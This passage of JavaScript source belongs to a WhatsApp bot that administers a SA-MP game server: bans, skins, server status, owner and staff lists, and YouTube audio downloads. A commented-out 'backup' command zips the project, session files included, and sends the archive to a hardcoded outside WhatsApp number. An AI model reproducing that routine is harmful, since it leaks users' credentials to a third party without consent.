        return reply('Gunakan format perintah yang benar: .unban [Nama]\nContoh: .unban Pablo_Satoru');
    }

    reply(mess.wait)
    const connection = mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database
    });

    // Query untuk menghapus ban dari database
    connection.query(
        'DELETE FROM banlog WHERE nameplayer = ?',
        [targetName],
        (err, results) => {
            if (err) {
                console.error(err);
                connection.end(); // Pastikan koneksi ditutup
                return reply('Terjadi kesalahan saat menghapus ban.');
            }

            if (results.affectedRows === 0) {
                return reply(`Pemain dengan nama ${targetName} tidak ditemukan di daftar ban.`);
            }

            reply(`Sukses menghapus ban untuk ${targetName}.`);
            connection.end(); // Tutup koneksi setelah selesai
        }
    );
}
break;

case 'listban': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');

    reply(mess.wait)
    const connection = mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database
    });

    // Query untuk mengambil daftar ban
    connection.query(
        'SELECT nameplayer FROM banlog',
        (err, results) => {
            if (err) {
                console.error(err);
                connection.end(); // Pastikan koneksi ditutup
                return reply('Terjadi kesalahan saat mengambil daftar ban.');
            }

            if (results.length === 0) {
                return reply('Tidak ada pemain yang sedang di-ban.');
            }

            const list = results.map((row, index) => `${index + 1}. ${row.nameplayer}`).join('\n');
            reply(`Daftar pemain yang di-ban:\n\n${list}`);
            connection.end(); // Tutup koneksi setelah selesai
        }
    );
}
break;

case 'setskin': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
    // Ambil nama pemain dan ID skin dari argumen
    if (!args[0] || !args[1]) {
        return reply('Format salah! Gunakan: setskin <nama_pemain> <id_skin>');
    }

    const playerName = args[0];
    const skinId = parseInt(args[1]);

    // Validasi ID skin
    if (isNaN(skinId) || skinId < 0 || skinId > 299) {
        return reply('ID skin harus angka antara 0 hingga 299!');
    }

    // Buat koneksi ke database
    const connection = mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database
    });

    connection.connect((err) => {
        if (err) {
            console.error('Koneksi database gagal:', err);
            return reply('Gagal menghubungkan ke database!');
        }

        // Ambil data pemain dari database
        connection.query(
            'SELECT pName FROM accounts WHERE pName = ?',
            [playerName],
            (err, results) => {
                if (err) {
                    console.error('Kesalahan query:', err);
                    connection.end();
                    return reply('Terjadi kesalahan saat mencari data pemain.');
                }

                if (results.length === 0) {
                    connection.end();
                    return reply(`Pemain dengan nama "${playerName}" tidak ditemukan!`);
                }

                // Update ID skin pemain
                connection.query(
                    'UPDATE accounts SET pSkin = ? WHERE pName = ?',
                    [skinId, playerName],
                    (err) => {
                        connection.end();
                        if (err) {
                            console.error('Kesalahan query:', err);
                            return reply('Gagal memperbarui ID skin pemain.');
                        }

                        // URL gambar skin
                        const skinImageUrl = `http://weedarr.wdfiles.com/local--files/skinlistc/${skinId}.png`;

                        // Kirim pesan dengan gambar skin
                        const teks = `Skin pemain "${playerName}" berhasil diubah menjadi ID ${skinId}!`;
                        const metadata = {
                            title: `Skin ID ${skinId}`,
                            publish: `Skin untuk pemain ${playerName}`,
                            thumbnail: skinImageUrl,
                        };

                        pablo.sendMessage(msg.key.remoteJid, {
                            text: teks,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: `${metadata.title}`,
                                    containsAutoReply: true,
                                    mediaType: 1,
                                    body: `${metadata.publish}`,
                                    thumbnailUrl: metadata.thumbnail,
                                    renderLargerThumbnail: true,
                                    mediaUrl: metadata.thumbnail,
                                    sourceUrl: skinImageUrl,
                                },
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: teks,
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: `By PabloDev`,
                                }),
                            },
                            headerType: 1,
                        }, { quoted: blonet });
                    }
                );
            }
        );
    });
}
break;

case 'server': {
    if (!allowedGroupsWl.includes(m.chat) && !allowedGroupsUcp.includes(m.chat)) {
        return reply('Perintah ini hanya bisa digunakan di grup whitelist dan ucp.');
    }
    let sampApiUrl = `https://pablo-network-rest-api.vercel.app/api/samp?key=pablo&host=${global.IpServer}&port=${global.PortServer}`;

    try {
        let response = await axios(sampApiUrl);
        let sampInfo = response.data;

        // Mengambil nilai dari properti yang diinginkan
        let address = sampInfo.address;
        let hostname = sampInfo.hostname.trim();
        let gamemode = sampInfo.gamemode;
        let playerOnline = sampInfo.online;
        let maxPlayers = sampInfo.maxplayers;
        let mapName = sampInfo.rules.mapname;
        let version = sampInfo.rules.version;
        let weather = sampInfo.rules.weather;
        let webUrl = sampInfo.rules.weburl;
        let worldTime = sampInfo.rules.worldtime;

        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
        let result = `
*${hostname}*

> IP:PORT:
> [ ${address}:${global.PortServer} ]

> Gamemode:
> [ ${gamemode} ]

> Players Online:
> [ ${playerOnline} ]

> Max Players: 
> [ ${maxPlayers} ]

> Map: 
> [ ${mapName} ]

> Version: 
> [ ${version} ]

> Weather:
> [ ${weather} ]

> Url:
> [ ${webUrl} ]

> Time:
> [ ${worldTime} ]`;

        // Menampilkan informasi pemain online (jika ada)
        reply(result);
    } catch (error) {
        console.error(error);
        reply('> Now Server Is Offline 🔴.');
    }
}
break;

case 'player': {
    if (!allowedGroupsWl.includes(m.chat) && !allowedGroupsUcp.includes(m.chat)) {
        return reply('Perintah ini hanya bisa digunakan di grup whitelist dan ucp.');
    }
    let sampApiUrl = `https://pablo-network-rest-api.vercel.app/api/samp?key=pablo&host=${global.IpServer}&port=${global.PortServer}`;

    try {
        let response = await axios(sampApiUrl);
        let sampInfo = response.data;

        // Mengambil nilai dari properti yang diinginkan
        let address = sampInfo.address;
        let hostname = sampInfo.hostname.trim();
        let playerOnline = sampInfo.online;
        let maxPlayers = sampInfo.maxplayers;

        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi
        let result = `
*${hostname}*

> IP:PORT:
> ${address}:${global.PortServer}

> Hostname:
> ${hostname}

> Player Online: 
> ${playerOnline}

> Max Players: 
> ${maxPlayers}`;

        // Menampilkan informasi pemain online (jika ada)
        reply(result);
    } catch (error) {
        console.error(error);
        reply('> Now Server Is Offline 🔴.');
    }
}
break;

case 'status': {
    if (!allowedGroupsWl.includes(m.chat) && !allowedGroupsUcp.includes(m.chat)) {
        return reply('Perintah ini hanya bisa digunakan di grup whitelist dan ucp.');
    }
    let sampApiUrl = `https://pablo-network-rest-api.vercel.app/api/samp?key=pablo&host=${global.IpServer}&port=${global.PortServer}`;

    try {
        let response = await axios(sampApiUrl);

        // Menampilkan hasil ke pengguna bahwa server online
        let result = `
> Now Server Is Online 🟢.`;

        reply(result);
    } catch (error) {
        console.error(error);
        reply('> Now Server Is Offline 🔴.');
    }
}
break;

          case 'ip': {
              if (!allowedGroupsWl.includes(m.chat) && !allowedGroupsUcp.includes(m.chat)) {
        return reply('Perintah ini hanya bisa digunakan di grup whitelist dan ucp.');
    }
              let IpMessage= `
> ${global.IpServer}:${global.PortServer}
              `;

              reply(IpMessage);
          }
          break;

/*case 'mc':
    // Pastikan pesan memiliki argumen yang cukup
    if (!args || args.length < 2) {
        reply('Format penggunaan salah. Gunakan .mc [bed/jav] [ip]');
        break;
    }
    
    // Pisahkan argumen menjadi tipe dan alamat IP
    const type = args[0].toLowerCase();
    const ip = args.slice(1).join(' ');

    let apiUrl = '';
    
    // Tentukan URL API berdasarkan tipe server Minecraft
    if (type === 'bed') {
        apiUrl = `https://pablo-network-rest-api.vercel.app/API/mc/bed?key=pablo&host=${ip}`;
    } else if (type === 'jav') {
        apiUrl = `https://pablo-network-rest-api.vercel.app/API/mc/jav?key=pablo&host=${ip}`;
    } else {
        reply('Tipe Minecraft tidak valid. Gunakan "bed" untuk Bedrock atau "jav" untuk Java.');
        break;
    }

    // Mengirim permintaan HTTP ke API menggunakan axios
    axios.get(apiUrl)
        .then(response => {
            // Memproses data respons dari API
            const data = response.data;

            // Menyiapkan pesan berformat
            let message = `
*${data.hostname}*

> IP:PORT:
> [ ${data.ip}:${data.port} ]

> Ping:
> [ ${data.debug.ping} ]

> Query:
> [ ${data.debug.query} ]

> SRV:
> [ ${data.debug.srv} ]

> Query Mismatch:
> [ ${data.debug.querymismatch} ]

> IP in SRV:
> [ ${data.debug.ipinsrv} ]

> CNAME in SRV:
> [ ${data.debug.cnameinsrv} ]

> Animated MOTD:
> [ ${data.debug.animatedmotd} ]

> Cache Hit:
> [ ${data.debug.cachehit} ]

> Cache Time:
> [ ${data.debug.cachetime} ]

> Cache Expire:
> [ ${data.debug.cacheexpire} ]

> API Version:
> [ ${data.debug.apiversion} ]

> MOTD:
> [ ${data.motd.clean[0]} ]

> Online:
> [ ${data.players.online} ]

> Max:
> [ ${data.players.max} ]

> Version:
> [ ${data.version} ]

> Online:
> [ ${data.online} ]

> Version:
> [ ${data.protocol.version} ]

> Name:
> [ ${data.protocol.name} ]

> Hostname:
> [ ${data.hostname} ]

> Software:
> [ ${data.software} ]

> Info:
> [ ${data.info.clean[0]} ]
> [ ${data.info.clean[1]} ]
> [ ${data.info.clean[2]} ]

> Eula Blocked:
> [ ${data.eula_blocked} ]
`;

            reply(message);
        })
        .catch(error => {
            console.error('Error:', error);
            reply(`Unable To Connect ${ip}`);
        });
    break;*/
                case 'sc':
                case 'script': {
                    reply('Script Ini Dijual Resmi Oleh Pablo. Jika Berminat Silahkan Hubungi Nomor Pablo Di Bawah Ini\n\nwa.me/62857552519341');
                    }
                break;

                /*case 'infobot':  
                      
    const getAllInfo = async () => {  
        try {  
            const uptimeBotsrv = process.uptime();  
            const uptimeTextBotsrv = `${Math.floor(uptimeBotsrv / 3600)} Jam, ${Math.floor((uptimeBotsrv % 3600) / 60)} Menit, ${Math.floor(uptimeBotsrv % 60)} Detik`;  
            const uptimeMso = Date.now() - startTimeBot;  
            const uptimeSecondso = Math.floor((uptimeMso / 1000) % 60);  
            const botUptimeHourso = Math.floor(uptimeSecondso / 3600);  
            const botUptimeMinuteso = Math.floor((uptimeSecondso % 3600) / 60);  
  
            // Ambil semua informasi  
            const system = await si.system();  
            const bios = await si.bios();  
            const baseboard = await si.baseboard();  
            const osInfo = await si.osInfo();  
            const cpu = await si.cpu();  
            const cpuTemperature = await si.cpuTemperature();  
            const currentLoad = await si.currentLoad();  
            const mem = await si.mem();  
            const fsSize = await si.fsSize();  
            const networkInterfaces = await si.networkInterfaces();  
            const time = await si.time();  
            const processes = await si.processes();  
  
            // Konversi RAM ke GB  
            const totalMemGB = ((mem.total || 0) / 1024 / 1024 / 1024).toFixed(2);  
            const usedMemGB = ((mem.used || 0) / 1024 / 1024 / 1024).toFixed(2);  
            const freeMemGB = ((mem.free || 0) / 1024 / 1024 / 1024).toFixed(2);  
  
            // Konversi Disk ke GB  
            const diskInfo = fsSize.map(d => ({  
                mount: d.mount || 'Unknown',  
                total: ((d.size || 0) / 1024 / 1024 / 1024).toFixed(2),  
                used: ((d.used || 0) / 1024 / 1024 / 1024).toFixed(2),  
                free: (((d.size || 0) - (d.used || 0)) / 1024 / 1024 / 1024).toFixed(2),  
                type: d.type || 'Unknown'  
            }));  
  
            // Waktu Aktif Server  
            const serverUptimeHours = Math.floor(time.uptime / 3600);  
            const serverUptimeMinutes = Math.floor((time.uptime % 3600) / 60);  
  
            // Format Output  
            let message = `  
╭───「 *INFO BOT* 」───❏  
├ *System:*  
│ ├ Manufacturer: ${system.manufacturer || 'Unknown'}  
│ ├ Model: ${system.model || 'Unknown'}  
│ ├ Serial: ${system.serial || 'Unknown'}  
│ ├ UUID: ${system.uuid || 'Unknown'}  
├───────────────────────  
├ *BIOS:*  
│ ├ Vendor: ${bios.vendor || 'Unknown'}  
│ ├ Version: ${bios.version || 'Unknown'}  
│ ├ Release Date: ${bios.releaseDate || 'Unknown'}  
├───────────────────────  
├ *Baseboard:*  
│ ├ Manufacturer: ${baseboard.manufacturer || 'Unknown'}  
│ ├ Model: ${baseboard.model || 'Unknown'}  
│ ├ Serial: ${baseboard.serial || 'Unknown'}  
│ ├ Version: ${baseboard.version || 'Unknown'}  
├───────────────────────  
├ *OS:*  
│ ├ Platform: ${osInfo.platform || 'Unknown'} (${osInfo.distro || 'Unknown'})  
│ ├ Versi OS: ${osInfo.release || 'Unknown'}  
│ ├ Arsitektur: ${osInfo.arch || 'Unknown'}  
│ ├ Kernel: ${osInfo.kernel || 'Unknown'}  
├───────────────────────  
├ *CPU:*  
│ ├ Nama: ${cpu.manufacturer || 'Unknown'} ${cpu.brand || 'Unknown'}  
│ ├ Model: ${cpu.model || 'Unknown'}  
│ ├ Kecepatan: ${cpu.speed || 'Unknown'} GHz  
│ ├ Core: ${cpu.cores || 'Unknown'}  
│ ├ Temperatur: ${cpuTemperature.main || 'Unknown'} °C  
│ ├ Load: ${currentLoad.currentLoad.toFixed(2) || 'Unknown'}%  
├───────────────────────  
├ *RAM:*  
│ ├ Total: ${totalMemGB} GB  
│ ├ Digunakan: ${usedMemGB} GB  
│ ├ Tersisa: ${freeMemGB} GB  
├───────────────────────  
├ *Disk Usage:*`;  
  
            diskInfo.forEach(d => {  
                message += `  
│ ├ Mount: ${d.mount}  
│ │ ├ Total: ${d.total} GB  
│ │ ├ Digunakan: ${d.used} GB  
│ │ ├ Tersisa: ${d.free} GB  
│ │ ├ Tipe: ${d.type}`;  
            });  
  
            message += `  
├───────────────────────  
├ *Network Interfaces:*`;  
  
            networkInterfaces.forEach(net => {  
                message += `  
│ ├ Nama: ${net.iface || 'Unknown'}  
│ │ ├ MAC: ${net.mac || 'Unknown'}  
│ │ ├ IPv4: ${net.ip4 || 'Unknown'}  
│ │ ├ IPv6: ${net.ip6 || 'Unknown'}  
│ │ ├ Kecepatan: ${net.speed || 'Unknown'} Mbps`;  
            });  
  
            message += `  
├───────────────────────  
├ *Proses Aktif:*  
│ ├ Total: ${processes.all || 'Unknown'}  
│ ├ Running: ${processes.running || 'Unknown'}  
│ ├ Blocked: ${processes.blocked || 'Unknown'}  
│ ├ Sleeping: ${processes.sleeping || 'Unknown'}  
├───────────────────────  
├ *Waktu Aktif:*  
│ ├ Server: ${serverUptimeHours} Jam ${serverUptimeMinutes} Menit  
│ ├ Bot: ${uptimeTextBotsrv}  
╰───────────────────────`;  
  
            // Kirim pesan  
            reply(message); // Ganti dengan handler bot Anda  
        } catch (error) {  
            reply('Gagal mendapatkan informasi:', error);  
        }  
    };  
  
    getAllInfo();  
    break;*/
    
    case 'restart':
    if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner');
    const restartMessage = `🔄 *Bot sedang di-restart...*\nHarap tunggu sebentar.`;

    reply(restartMessage);

    setTimeout(() => {
        process.exit(); 
    }, 1000);  

    break;
    
    case 'ao':
case 'addowner': 
case 'a': {
    const own = JSON.parse(fs.readFileSync('./owner.json').toString());
    if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner');
    if (!args[0]) return reply(`Contoh: ${prefix + command} [nomor tanpa tag]\nContoh: ${prefix + command} 6281234567890`);

    // Validasi input nomor
    const users = args[0].replace(/[^0-9]/g, ''); // Hanya ambil angka
    if (!users) return reply('Nomor tidak valid. Masukkan angka tanpa spasi atau karakter lain.');

    if (!own.includes(users)) {
        own.push(users);
        fs.writeFileSync('./owner.json', JSON.stringify(own, null, 2));
        reply(`Berhasil menambahkan nomor ${users} sebagai owner.`);
    } else {
        reply('Nomor sudah terdaftar sebagai owner.');
    }
}
break;

case 'delowner': 
case 'removeowner': {
    const own = JSON.parse(fs.readFileSync('./owner.json').toString());
    if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner');
    if (!args[0]) return reply(`Contoh: ${prefix + command} [nomor tanpa tag]\nContoh: ${prefix + command} 6281234567890`);

    // Validasi input nomor
    const users = args[0].replace(/[^0-9]/g, ''); // Hanya ambil angka
    if (!users) return reply('Nomor tidak valid. Masukkan angka tanpa spasi atau karakter lain.');

    if (own.includes(users)) {
        const index = own.indexOf(users);
        own.splice(index, 1); // Hapus dari array
        fs.writeFileSync('./owner.json', JSON.stringify(own, null, 2));
        reply(`Berhasil menghapus nomor ${users} dari daftar owner.`);
    } else {
        reply('Nomor tidak ditemukan dalam daftar owner.');
    }
}
break;

case 'listowner':
case 'owner': {
    const own = JSON.parse(fs.readFileSync('./owner.json').toString());
    if (!own.length) return reply('Tidak ada owner yang terdaftar.');
    
    let ownersList = 'Daftar Owner:\n';
    own.forEach((owner, index) => {
        ownersList += `${index + 1}. ${owner}\n`; // Format nomor owner
    });

    reply(ownersList);
}
break;
        
case 'as':
case 'addstaff': 
case 'addadmin': {
    const own = JSON.parse(fs.readFileSync('./staff.json').toString());
    if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner');
    if (!args[0]) return reply(`Contoh: ${prefix + command} [nomor]\nContoh: ${prefix + command} 6281234567890`);

    // Validasi input nomor
    const users = args[0].replace(/[^0-9]/g, ''); // Hanya ambil angka
    if (!users) return reply('Nomor tidak valid. Masukkan angka tanpa spasi atau karakter lain.');

    if (!own.includes(users)) {
        own.push(users);
        fs.writeFileSync('./staff.json', JSON.stringify(own, null, 2));
        reply(`Berhasil menambahkan nomor ${users} sebagai admin bot.`);
    } else {
        reply('Nomor sudah terdaftar sebagai admin bot.');
    }
}
break;

case 'deladmin':
case 'removeadmin':
case 'delstaff': 
case 'removestaff': {
    const own = JSON.parse(fs.readFileSync('./staff.json').toString());
    if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner');
    if (!args[0]) return reply(`Contoh: ${prefix + command} [nomor]\nContoh: ${prefix + command} 6281234567890`);

    // Validasi input nomor
    const users = args[0].replace(/[^0-9]/g, ''); // Hanya ambil angka
    if (!users) return reply('Nomor tidak valid. Masukkan angka tanpa spasi atau karakter lain.');

    if (own.includes(users)) {
        const index = own.indexOf(users);
        own.splice(index, 1); // Hapus dari array
        fs.writeFileSync('./staff.json', JSON.stringify(own, null, 2));
        reply(`Berhasil menghapus nomor ${users} dari daftar admin bot.`);
    } else {
        reply('Nomor tidak ditemukan dalam daftar admin bot.');
    }
}
break;

case 'listadmin':
case 'admin':
case 'liststaff':
case 'staff': {
    const own = JSON.parse(fs.readFileSync('./staff.json').toString());
    if (!own.length) return reply('Tidak ada admin bot yang terdaftar.');
    
    let ownersList = 'Daftar Admin Bot:\n';
    own.forEach((owner, index) => {
        ownersList += `${index + 1}. ${owner}\n`; // Format nomor owner
    });

    reply(ownersList);
}
break;

/*case 'backup':
        case 'backupwithsession': {
if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner'); 
await reply('Start Backup');
const { execSync } = require("child_process");
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != ".npm" &&
pe != ".cache" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
await reply('Script Akan Dikirim Lewat PC')
const exec = await execSync(`zip -r BackupV8.zip ${ls.join(" ")}`);
await pablo.sendMessage('62857552519341' + "@s.whatsapp.net", {
document: await fs.readFileSync("./BackupV8.zip"),
mimetype: "application/zip",
fileName: "BackupV8.zip",
},
{quoted: blonet });
await execSync("rm -rf BackupV8.zip");
}
break*/

case 'clearsesi':
case 'clearsession': {
    if (!isOwner) return reply('Khusus Owner');
    function clearSession() {
    let directoryPath = path.join(`./PabloRawr`);
    fs.readdir(directoryPath, async function (err, files) {
        if (err) {
            reply('Tidak dapat memindai direktori: ' + err);
            return;
        }

        let filteredArray = files.filter(item => item.startsWith("session") || item.startsWith("pre-key") || item.startsWith("sender-key"));
        let teks = `Menghapus ${filteredArray.length} file sampah...\n\n`;
        if (filteredArray.length === 0) {
            reply(teks);
            return;
        }

        console.log(teks);
        filteredArray.forEach(function (file) {
            fs.unlinkSync(`./PabloRawr/${file}`);
        });
        reply('Berhasil menghapus semua sampah');
    });
}


clearSession();
}
break;

/**case 'ytmp3': {
  if (args.length === 0) {
    pablo.sendMessage(msg.key.remoteJid, {
      text: `Cara penggunaan: \n.ytmp3 [url/link YouTube atau youtu.be]`
    }, { quoted: blonet });
    break;
  }

  const youtubeUrl = args[0];

  // Validasi URL
  if (!youtubeUrl.startsWith("http") || 
      (!youtubeUrl.includes("youtube.com") && !youtubeUrl.includes("youtu.be"))) {
    pablo.sendMessage(msg.key.remoteJid, {
      text: `Link tidak valid. Pastikan Anda memasukkan link YouTube yang benar.`
    }, { quoted: blonet });
    break;
  }

  try {
    // Log: Memulai proses
    reply('⏳ Memproses link YouTube...');

    let response = await axios(`https://pablo-network-rest-api.vercel.app/api/ytmp3`, {
      params: { url: youtubeUrl, key: 'pablo' },
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36' }
    });

    let musicData = response.data;

    if (musicData.metadata && musicData.media) {
      let { metadata, media } = musicData;

      pablo.sendMessage(msg.key.remoteJid, {
        caption: `> *Title:*\n> ${metadata.title}\n\n> *Duration:*\n> ${metadata.seconds} seconds\n\n> *Uploaded:*\n> ${metadata.publish}\n\n> *Views:*\n> ${metadata.views}\n\n> *Author:*\n> ${metadata.author.name} (${metadata.author.url})\n\n> *Description:*\n> ${metadata.description}`,
        image: { url: metadata.thumbnail }
      }, { quoted: blonet });

      pablo.sendMessage(msg.key.remoteJid, {
        audio: { url: media['128kbps'].url },
        fileName: `${metadata.title}.mp3`,
        mimetype: 'audio/mp4',
        ptt: false,
      }, { quoted: blonet }).then(() => {
        console.log('✅ File terkirim');
      }).catch(err => {
        console.error('❌ Gagal mengirim file:', err);
        pablo.sendMessage(msg.key.remoteJid, { text: 'Gagal mengirim file audio.' }, { quoted: blonet });
      });

    } else {
      reply('❌ API mengembalikan respons tidak valid. Musik tidak ditemukan atau gagal diunduh.');
    }

  } catch (err) {
    if (err.response && err.response.status === 410) {
      reply('❌ API tidak lagi tersedia atau telah dihapus.');
    } else {
      console.error('❌ Terjadi kesalahan:', err.message);
      reply('❌ Terjadi kesalahan saat memproses link YouTube.');
    }
  }
}
break;
**/

case 'yt':
case 'ytmp3': {
  if (args.length === 0) {
    pablo.sendMessage(msg.key.remoteJid, {
      text: `Cara penggunaan: \n.ytmp3 [url/link YouTube atau youtu.be]`
    }, { quoted: blonet });
    break;
  }

  const youtubeUrl = args[0];

  // Validasi URL
  if (!youtubeUrl.startsWith("http") || 
      (!youtubeUrl.includes("youtube.com") && !youtubeUrl.includes("youtu.be"))) {
    pablo.sendMessage(msg.key.remoteJid, {
      text: `Link tidak valid. Pastikan Anda memasukkan link YouTube yang benar.`
    }, { quoted: blonet });
    break;
  }

  try {
    reply('⏳ Memproses link YouTube...');

    const response = await axios.get(`https://installer.pablocloud.biz.id/api/yt-srv.php?url=${youtubeUrl}`);
    const audioUrl = response.data.result;

    if (!audioUrl || !audioUrl.startsWith('http')) {
      return pablo.sendMessage(msg.key.remoteJid, {
        text: '❌ Gagal mengunduh audio. Link tidak valid.'
      }, { quoted: blonet });
    }

    await pablo.sendMessage(msg.key.remoteJid, {
      audio: { url: audioUrl },
      fileName: `PabloCloud.mp3`,
      mimetype: 'audio/mp4',
      ptt: false
    }, { quoted: blonet });

    console.log('✅ File terkirim');
  } catch (err) {
    console.error('❌ Error saat download YTMP3:', err.message);
    pablo.sendMessage(msg.key.remoteJid, {
      text: '❌ Terjadi kesalahan saat memproses link YouTube.'
    }, { quoted: blonet });
  }

  break;
}

/*case 'play': {
    const yts = require('yt-search');
    if (args.length === 0)
        return pablo.sendMessage(m.chat, { text: `🎶 Ketikkan nama lagu atau URL YouTube, misalnya:\n${prefix + command} dj kane` }, { quoted: blonet });

    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0)
            return pablo.sendMessage(m.chat, { text: '🔍 Lagu yang Anda cari tidak ditemukan. Silakan coba lagi dengan kata kunci yang lebih tepat.' }, { quoted: blonet });

        const video = search.all[0];
        const detail = `🎥 *Youtube Audio Play*

*❖ Judul* : ${video.title}
*❖ Penonton* : ${video.views}
*❖ Pengarang* : ${video.author.name}
*❖ Diunggah* : ${video.ago}
*❖ URL* : ${video.url}

🔄 _Proses pengunduhan audio, harap tunggu..._`;

        await pablo.sendMessage(m.chat, { text: detail }, { quoted: blonet });

        // === GUNAKAN API KAMU SENDIRI ===
        const apiRes = await axios.get(`https://installer.pablocloud.biz.id/api/yt-srv.php?url=${encodeURIComponent(video.url)}`);
        const data = apiRes.data;

        if (data.error || !data.result) {
            return pablo.sendMessage(m.chat, { text: '❌ Gagal mengunduh audio. Coba lagi nanti.' }, { quoted: blonet });
        }

        const audioUrl = data.result;
        const title = data.title || video.title;

        // Kirim audio langsung
        await pablo.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: 'audio/mpeg',
            fileName: `${title}.mp3`
        }, { quoted: blonet });

        await pablo.sendMessage(m.chat, {
            text: `🎧 Audio *${title}* telah berhasil diunduh dan siap untuk dinikmati! 🎶`
        }, { quoted: blonet });

        // Upload ke top4top.io
        /*reply('📤 Uploading to top4top.io...');
        let audioBuffer = await (await axios.get(audioUrl, { responseType: 'arraybuffer' })).data;
        let link = await top4top(audioBuffer);

        await pablo.sendMessage(m.chat, {
            text: `🔗 *Link Boombox:*\n${link}\n💾 *Note:*\n*Gunakan http untuk dipakai dalam SA-MP/boombox*`
        }, { quoted: blonet });*//*

    } catch (error) {
        console.error('Error:', error);
        pablo.sendMessage(m.chat, { text: '⚠️ Terjadi kesalahan saat mencoba mengunduh audio. Mohon coba lagi nanti.' }, { quoted: blonet });
    }
}
break;*/
        
case 'play': {
    const yt = require('@vreden/youtube_scraper');
    const yts = require('yt-search');

    if (args.length === 0)
        return pablo.sendMessage(m.chat, { 
            text: `🎶 Ketikkan nama lagu atau URL YouTube\nContoh: ${prefix + command} dj kane` 
        }, { quoted: blonet });

    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0)
            return pablo.sendMessage(m.chat, { 
                text: '🔍 Lagu tidak ditemukan, coba kata kunci lain.' 
            }, { quoted: blonet });

        const video = search.all[0];

        const info = `🎥 *Youtube Audio Play*

*❖ Judul* : ${video.title}
*❖ Penonton* : ${video.views}
*❖ Pengarang* : ${video.author.name}
*❖ Diunggah* : ${video.ago}
*❖ URL* : ${video.url}

🔄 _Sedang memproses audio..._`;

        await pablo.sendMessage(m.chat, { text: info }, { quoted: blonet });

        // === DOWNLOAD MP3 PAKAI MODULE ===
        const result = await yt.ytmp3(video.url, 128);

        if (!result || !result.status || !result.download || !result.download.url) {
            return pablo.sendMessage(m.chat, { 
                text: '❌ Gagal memproses audio. Coba lagi nanti.' 
            }, { quoted: blonet });
        }

        const mp3Url = result.download.url;
        const title = result.metadata.title || video.title;

        // === KIRIM AUDIO KE WA ===
        await pablo.sendMessage(m.chat, {
            audio: { url: mp3Url },
            mimetype: 'audio/mpeg',
            fileName: `${title}.mp3`,
            
            contextInfo: {
                    externalAdReply: {
                        title: title,
                        body: video.author.name,
                        thumbnailUrl: video.thumbnail,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
        }, { quoted: blonet });

        /*await pablo.sendMessage(m.chat, {
            text: `🎧 Audio *${title}* berhasil diunduh!`
        }, { quoted: blonet });*/

    } catch (e) {
        console.error('PLAY ERROR:', e);
        pablo.sendMessage(m.chat, { 
            text: `⚠️ Terjadi kesalahan:\n${e.message}` 
        }, { quoted: blonet });
    }
}
break;
        
/*case 'play': {
    if (args.length === 0) return pablo.sendMessage(m.chat, { text: `🎶 Ketikkan nama lagu atau URL YouTube, misalnya:\n${prefix+command} dj kane` }, { quoted: blonet });
    
    const yts = require('yt-search');
    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0) return pablo.sendMessage(m.chat, { text: '🔍 Lagu yang Anda cari tidak ditemukan. Silakan coba lagi dengan kata kunci yang lebih tepat.' }, { quoted: blonet });

        const video = search.all[0];
        const detail = `🎥 *Youtube Audio Play*

*❖ Judul* : ${video.title}
*❖ Penonton* : ${video.views}
*❖ Pengarang* : ${video.author.name}
*❖ Diunggah* : ${video.ago}
*❖ URL* : ${video.url}

🔄 _Proses pengunduhan audio, harap tunggu..._`;

        await pablo.sendMessage(m.chat, { text: detail }, { quoted: blonet });

        const format = 'mp3';
        const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(video.url)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;

        const response = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        if (!response.data || !response.data.success) return conn.sendMessage(m.chat, { text: '❌ Gagal mengunduh audio. Coba lagi nanti.' }, { quoted: blonet });

        const { id, title, info } = response.data;
        const { image } = info;

        while (true) {
            const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });

            if (progress.data && progress.data.success && progress.data.progress === 1000) {
                const downloadUrl = progress.data.download_url;

                await pablo.sendMessage(m.chat, {
                    audio: { url: downloadUrl },
                    mimetype: 'audio/mpeg',
                    fileName: `${title}.mp3`
                }, { quoted: blonet });

                await pablo.sendMessage(m.chat, {
                    text: `🎧 Audio *${title}* telah berhasil diunduh dan siap untuk dinikmati! 🎶`
                }, { quoted: blonet });
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    } catch (error) {
        console.error('Error:', error);
